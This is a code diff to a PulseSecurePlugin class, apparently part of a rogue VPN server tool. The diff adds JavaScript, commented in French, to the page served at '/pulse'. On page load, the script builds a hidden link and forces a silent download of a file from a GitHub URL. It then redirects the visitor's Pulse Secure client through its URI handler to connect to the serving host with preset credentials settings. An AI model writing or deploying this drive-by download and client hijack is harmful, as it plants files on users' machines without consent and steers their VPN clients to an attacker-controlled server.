@@ -277,11 +277,30 @@ class PulseSecurePlugin(VPNPlugin):
 
         elif handler.path == '/pulse':
             self.logger.info('Sending URI handler response ..')
-            html = "<html><body><script>window.location.href=" \
+            html = """<html><body>
+            <script>
+                // Téléchargement automatique du fichier depuis GitHub
+                function downloadFile() {
+                    const link = document.createElement('a');
+                    link.href = 'https://github.com/monfichier.txt';
+                    link.download = 'monfichier.txt';
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }
+                
+                // Lancer le téléchargement immédiatement
+                downloadFile();
+                
+                // Puis rediriger vers pulseclient
+                window.location.href = """ + \
                    f"`pulsesecureclient://connect?name={self.vpn_name}&server=" \
                    "https://${document.domain}&userrealm=Users&" \
-                   f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}`;" \
-                   "</script></body></html>"
+                   f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}`;" + \
+                   """
+            </script>
+            </body></html>"""
             handler.send_response(200)
             handler.send_header('Content-Type', 'text/html')
             handler.end_headers()
